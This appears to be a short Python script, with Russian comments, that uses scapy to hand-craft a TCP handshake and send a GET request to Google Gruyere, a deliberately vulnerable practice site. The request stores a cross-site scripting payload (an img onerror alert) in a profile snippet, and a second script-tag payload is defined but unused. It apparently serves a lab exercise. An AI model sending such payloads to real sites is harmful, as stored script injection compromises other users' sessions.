from scapy.all import *
from scapy.layers.inet import IP, TCP
import random
import socket

dest = "google-gruyere.appspot.com"
dest_ip = socket.gethostbyname(dest)
base_url = "/635188155526610086574573700068583544679"

endpoints = ["/saveprofile?action=update&name=ChillCheeseGuy&oldpw=cheese123&pw=&icon=&web_site=&color=&private_snippet=%3Cimg+src%3D%22nonexistent.jpg%22+onerror%3D%22alert%28%27XSS%27%29%22%3E"]
# "/editprofile.gtl", "/snippets.gtl", "/newsnippet.gtl", "/upload.gtl", "/login", "/newaccount.gtl", "/logout", "/upload.gtl
max_requests = 1

payload = "<script>alert('XSS')</script>"

for endpoint in endpoints:
    getStr = f'GET {base_url + endpoint} HTTP/1.1\r\nHost: {dest}\r\nAccept-Encoding: gzip, deflate\r\n\r\n'

    counter = 0
    while counter < max_requests:
        try:
            syn = IP(dst=dest_ip) / TCP(sport=random.randint(1025, 65500), dport=80, flags='S')
            syn_ack = sr1(syn, timeout=2)

            if not syn_ack or TCP not in syn_ack:
                print(f"Не удалось получить SYN-ACK для запроса {counter + 1}.")
                break

            ack = IP(dst=dest_ip) / TCP(dport=80, sport=syn_ack[TCP].sport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A')
            send(ack, verbose=0)

            http_request = IP(dst=dest_ip) / TCP(dport=80, sport=syn_ack[TCP].sport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='PA') / getStr
            response = sr1(http_request, timeout=2)

            if response:
                print(f"Ответ получен для запроса {counter + 1}: {response.summary()}")
            else:
                print(f"Нет ответа для запроса {counter + 1}.")

        except Exception as e:
            print(f"Ошибка при обработке запроса {counter + 1}: {e}")

        counter += 1
